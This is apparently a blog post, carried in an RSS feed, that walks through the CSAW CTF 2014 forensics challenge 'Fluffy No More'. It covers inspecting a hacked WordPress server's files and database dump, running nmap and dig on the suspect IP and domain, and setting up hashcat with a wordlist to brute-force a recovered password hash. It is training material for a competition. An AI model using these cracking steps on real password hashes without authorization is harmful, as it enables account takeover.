&lt;hr /&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Wed, 01 Oct 2014 12:21:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-01:understanding-the-shellshock-vulnerability.html</guid><category>Shellshock</category><category>Bash</category><category>Command Injection</category></item><item><title>CSAW CTF 2014 - Forensics 300: "Fluffy No More"</title><link>http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html</link><description>&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
&lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner.
Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??&lt;/p&gt;
&lt;p&gt;Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!&lt;/p&gt;
&lt;p&gt;Written by brad_anton&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/649bdf6804782af35cb9086512ca5e0d/CSAW2014-FluffyNoMore-v0.1.tar.bz2"&gt;CSAW2014-FluffyNoMore-v0.1.tar.bz2&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!&lt;/p&gt;
&lt;h2&gt;Inspecting the Directories&lt;/h2&gt;
&lt;p&gt;We start by checking the identity of the file with the command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;. We do this to make sure that the extension is not misleading:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file CSAW2014-FluffyNoMore-v0.1.tar.bz2
CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block &lt;span class="nv"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 900k
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;OK, cool, we can go ahead and unzip the &lt;em&gt;bzip2&lt;/em&gt; (compressed) tarball:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar --help | grep bz
  -j, --bzip2                filter the archive through bzip2
&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now let's take a look inside the folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree CSAW2014-FluffyNoMore-v0.1
CSAW2014-FluffyNoMore-v0.1
├── etc_directory.tar.bz2
├── logs.tar.bz2
├── mysql_backup.sql.bz2
└── webroot.tar.bz2

0 directories, 4 files
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, 4 more tarballs. Unziping and organizing them give us the following directories:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;
&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mysql_backup&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sql&lt;/span&gt; &lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt; &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="n"&gt;dump&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is the directory structure of a  &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;, where LAMP stands for Linux-Apache-MySQL-PHP in the &lt;a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html"&gt;Linux File System&lt;/a&gt;. In this framework, the PHP/HTML/JavaScript webpage is placed inside &lt;code&gt;var/www&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;var/&lt;/code&gt; contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at &lt;code&gt;/var/log&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Finally, the &lt;code&gt;etc/&lt;/code&gt; directory contains the system configuration files. For example, the file &lt;code&gt;resolv.conf&lt;/code&gt; tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example is the file  &lt;code&gt;passwd&lt;/code&gt;, which stores login information.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Before Anything else...&lt;/h2&gt;
&lt;p&gt;OK, based on the previous challenges, we need to give a try:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt;
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css

&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Analyzing the MySQL Dump File&lt;/h2&gt;
&lt;p&gt;Let's start taking a look at &lt;code&gt;mysql_backup.sql&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Of course, no luck for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat mysql_backup.sql | grep &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fine. We open &lt;code&gt;mysql_backup.sql&lt;/code&gt; in a text editor. The comments table shows that someone named "hacker" made an appearance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)&lt;/span&gt;
&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;span class="c1"&gt;-- Host: localhost    Database: wordpress&lt;/span&gt;
&lt;span class="c1"&gt;-- ------------------------------------------------------&lt;/span&gt;

&lt;span class="c1"&gt;-- Dumping data for table `wp_comments`&lt;/span&gt;
&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;span class="c1"&gt;(..)&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hacker&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hacker@secretspace.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.130&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 14:21:26&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 14:21:26&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I HATE BUNNIES AND IM GOING TO HACK THIS SITE BWHAHAHAHAHAHAHAHAHAHAHAH!!!!!!! BUNNIES SUX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bald Bunny&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nohair@hairlessclub.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.130&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 20:47:18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 20:47:18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I find this blog EXTREMELY OFFENSIVE!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MASTER OF DISASTER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;shh@nottellin.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.137&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-17 19:40:57&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-17 19:40:57&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Shut up baldy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we have the (possible) &lt;strong&gt;attacker's email&lt;/strong&gt; and &lt;strong&gt;IP address&lt;/strong&gt;. Maybe we can try to find a bit more about  her.&lt;/p&gt;
&lt;p&gt;Unfortunately the IP  leads to nowhere:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ping 192.168.127.130
PING 192.168.127.130 &lt;span class="o"&gt;(&lt;/span&gt;192.168.127.130&lt;span class="o"&gt;)&lt;/span&gt; 56&lt;span class="o"&gt;(&lt;/span&gt;84&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
^C
--- 192.168.127.130 ping statistics ---
160 packets transmitted, 0 received, 100% packet loss, &lt;span class="nb"&gt;time &lt;/span&gt;158999ms

&lt;span class="nv"&gt;$ &lt;/span&gt;nmap -A -v 192.168.127.130
Starting Nmap 6.45 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2014-09-25 15:43 EDT
NSE: Loaded 118 scripts &lt;span class="k"&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 15:43
Scanning 192.168.127.130 &lt;span class="o"&gt;[&lt;/span&gt;2 ports&lt;span class="o"&gt;]&lt;/span&gt;
Completed Ping Scan at 15:43, 3.00s elapsed &lt;span class="o"&gt;(&lt;/span&gt;1 total hosts&lt;span class="o"&gt;)&lt;/span&gt;
Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;192.168.127.130 &lt;span class="o"&gt;[&lt;/span&gt;host down&lt;span class="o"&gt;]&lt;/span&gt;
NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap &lt;span class="k"&gt;done&lt;/span&gt;: 1 IP address &lt;span class="o"&gt;(&lt;/span&gt;0 hosts up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 3.13 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Searching for the host &lt;strong&gt;secretspace.com&lt;/strong&gt; leads to some generic website. Inspecting its source code does not give us any hint either. Maybe its IP address?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;dig secretspace.com

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secretspace.com
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: 61131
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;secretspace.com.       IN  A

;; ANSWER SECTION:
secretspace.com.    285 IN  A   72.167.232.29

;; Query &lt;span class="nb"&gt;time&lt;/span&gt;: 7 msec
;; SERVER: 10.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;10.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
;; WHEN: Thu Sep 25 15:51:26 EDT 2014
;; MSG SIZE  rcvd: 49
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...&lt;/p&gt;
&lt;p&gt;All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use &lt;a href="http://www.phpmyadmin.net/home_page/index.php"&gt;phpMyAdmin&lt;/a&gt;, which I showed how to install and to configure in my tutorial about setting up a &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We open &lt;code&gt;localhost/phpmyadmin&lt;/code&gt; in our browser. First we go  to &lt;em&gt;Databases&lt;/em&gt; and then &lt;em&gt;Create Database&lt;/em&gt; with any name we want. Then we  &lt;em&gt;Import&lt;/em&gt; &lt;code&gt;`mysql_backup.sql&lt;/code&gt; to this database. All the tables are loaded. Let's use the &lt;em&gt;Search&lt;/em&gt; option to look for &lt;em&gt;key&lt;/em&gt; or &lt;em&gt;flag&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/tVOY1VJ.png" /&gt;
&lt;img alt="" src="http://i.imgur.com/jY7CbLZ.png" /&gt;&lt;/p&gt;
&lt;p&gt;Nope. Nothing in special. By the way, &lt;code&gt;`default_pingback_flag1&lt;/code&gt; is just a &lt;strong&gt;Wordpress&lt;/strong&gt; flag indicating the default status of ping backs when new blog posts are published.&lt;/p&gt;
&lt;p&gt;Let's continue our search. If we look  inside each of the tables we find:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The URL for the &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com"&gt;blog&lt;/a&gt;, which doesn't render. However, in the source code there is a commented link that leads to a &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;amp;cifr=1&amp;amp;%22"&gt;cute website&lt;/a&gt;. Nothing else.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Oh, wait! We found a hashed password!
&lt;img alt="" src="http://i.imgur.com/FiQONze.png" /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Cracking the Password&lt;/h2&gt;
&lt;p&gt;We want to crack &lt;code&gt;$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1&lt;/code&gt; and for this we are going to use &lt;a href="http://hashcat.net/hashcat/"&gt;hashcat&lt;/a&gt;. If you are in &lt;a href="http://www.kali.org/"&gt;Kali&lt;/a&gt; or in any Debian distribution you can install it with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;apt-get hashcat
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In Fedora, we need to download and unzip it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://hashcat.net/files/hashcat-0.47.7z
&lt;span class="nv"&gt;$ &lt;/span&gt;7za e hashcat-0.47.7z
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we are going to perform a brute force attack so we need a list of passwords. If you are using Kali, you can find them with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;locate wordlist
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If not, this is an example for you (it's always good to have several lists!):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://www.scovetta.com/download/500_passwords.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;head 500_passwords.txt
123456
password
12345678
1234
12345
dragon
qwerty
696969
mustang
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hashcat is awesome because it gives you a list of hash types:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;
   &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="mi"&gt;50&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;MD5&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;MD5&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA1&lt;/span&gt;
  &lt;span class="mi"&gt;110&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;120&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;130&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;140&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="mi"&gt;150&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;160&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQL&lt;/span&gt;
  &lt;span class="mi"&gt;300&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQL4&lt;/span&gt;&lt;span class="mf"&gt;.1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;MySQL5&lt;/span&gt;
